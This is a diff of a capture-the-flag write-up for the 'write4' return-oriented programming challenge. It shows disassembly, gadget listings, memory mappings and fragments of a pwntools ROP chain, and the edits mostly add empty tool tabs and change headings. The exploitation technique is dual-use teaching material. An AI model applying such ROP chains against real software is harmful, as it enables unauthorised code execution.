@@ -14,6 +14,12 @@ Running the binary proves to be pretty useless because none of the output is par
 
 When we open the binary in `gdb` / `radare2`, we notice that `pwnme` function is actually inside _libwrite4.so_, so we go there first. Checking the contents of `pwnme` in `radare2`:
 
+{% tabs %}
+{% tab title="GDB" %}
+
+{% endtab %}
+
+{% tab title="Radare2" %}
 ```as
 [0x7f58ace007d0]> pdf@sym.pwnme
 ┌ 153: sym.pwnme ();
@@ -54,6 +60,8 @@ When we open the binary in `gdb` / `radare2`, we notice that `pwnme` function is
 │           0x7f58ace00941      c9             leave
 └           0x7f58ace00942      c3             ret
 ```
+{% endtab %}
+{% endtabs %}
 
 The reason that I like `radare2` for static analysis is that it provides function headers and resolves strings automatically. This makes the disassembly process a lot easier. I personally think that `gdb` has better stepping usability for dynamic analysis but is less feature-friendly for static analysis.
 
@@ -61,6 +69,12 @@ From this function, we notice that we're allowed a `0x200` byte payload to be re
 
 Searching around the binary, we find the function `print_file`:
 
+{% tabs %}
+{% tab title="GDB" %}
+
+{% endtab %}
+
+{% tab title="Radare2" %}
 ```as
 ┌ 140: sym.print_file (int64_t arg1);
 │           ; arg int64_t arg1 @ rdi
@@ -103,6 +117,8 @@ Searching around the binary, we find the function `print_file`:
 │           0x7f30ac2009cd      c9             leave
 └           0x7f30ac2009ce      c3             ret
 ```
+{% endtab %}
+{% endtabs %}
 
 Based on the C code provided, this binary takes an `int64_t`, resolves the string at that address, then prints the file's contents with that name. This means that we need to find the address of _flag.txt_ in memory and then pass this address into `print_file`, and we'll have the flag!
 
@@ -112,6 +128,8 @@ The first step you should take is to find the flag in memory. `strings write4 | 
 
 Our next step should be to check the gadgets to see if there's a way to pass data into memory. We need a way to store the string _flag.txt_ at an address of our choice and then pass that address into `print_file`. Let's look around `ROPgadget` for some `pop` gadgets:
 
+{% tabs %}
+{% tab title="ROPgadget" %}
 ```bash
 $ ROPgadget --binary write4 --only "pop|ret"
 Gadgets information
@@ -128,6 +146,12 @@ Gadgets information
 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x00000000004004e6 : ret
 ```
+{% endtab %}
+
+{% tab title="ropper" %}
+
+{% endtab %}
+{% endtabs %}
 
 This seems useful enough. This provides us a way to load the first two parameter registers, meaning that we can pass an address into `print_file`. We know that the end of our payload will look something like:
 
@@ -147,6 +171,8 @@ This would let us put _flag.txt_ in `register_2`, and then store it at the value
 
 Let's check `ROPgadget` for some options:
 
+{% tabs %}
+{% tab title="ROPgadget" %}
 ```bash
 $ ROPgadget --binary write4 --only "mov|pop|ret"
 Gadgets information
@@ -169,6 +195,12 @@ Gadgets information
 
 Unique gadgets found: 15
 ```
+{% endtab %}
+
+{% tab title="ropper" %}
+
+{% endtab %}
+{% endtabs %}
 
 We find the following gadget which suits our needs:
 
@@ -202,6 +234,8 @@ Now, we need to figure out where we want to write. This is a crucial step becaus
 
 We can check the mappings inside `gdb` and find a writeable location:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```bash
 gef➤  info proc mappings
 process 54986
@@ -212,9 +246,17 @@ Mapped address spaces:
             0x600000           0x601000     0x1000        0x0  r--p   /home/joybuzzer/Documents/vunrotc/public/binex/05-rop/write4/src/write4
             0x601000           0x602000     0x1000     0x1000  rw-p   /home/joybuzzer/Documents/vunrotc/public/binex/05-rop/write4/src/write4
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 We see that the `0x601000-0x602000` range is the only writeable range, so let's check around in there. We're looking for memory that's hopefully not used.
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  x/20gx 0x601000
 0x601000:	0x0000000000600e00	0x00007ffff7ffe2e0
@@ -228,6 +270,12 @@ gef➤  x/20gx 0x601000
 0x601080:	0x0000000000000000	0x0000000000000000
 0x601090:	0x0000000000000000	0x0000000000000000
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 We see that `0x601030` doesn't seem to be used by anything, so we'll choose there. We could play it safer and choose something further away, but in this case, we'll see it doesn't matter.
 
@@ -290,7 +338,7 @@ proc.interactive()
 This works! This gets us the flag.
 
 {% hint style="success" %}
-#### **If we want to make our exploit more robust...**
+### **If we want to make our exploit more robust...**
 
 We would need to ensure that the string is null-terminated. In the case that the data block after the one we chose gets used, we would need to ensure that the _flag.txt_ string is null-terminated.
 
@@ -307,7 +355,7 @@ ropChain += p64(g_writeR15AtR14)
 This would ensure that our string is null-terminated, and that our code works.
 {% endhint %}
 
-### Alternative Solution
+## Alternative Solution
 
 _This is the solution I mentioned earlier_. This solution uses the following gadget:
 
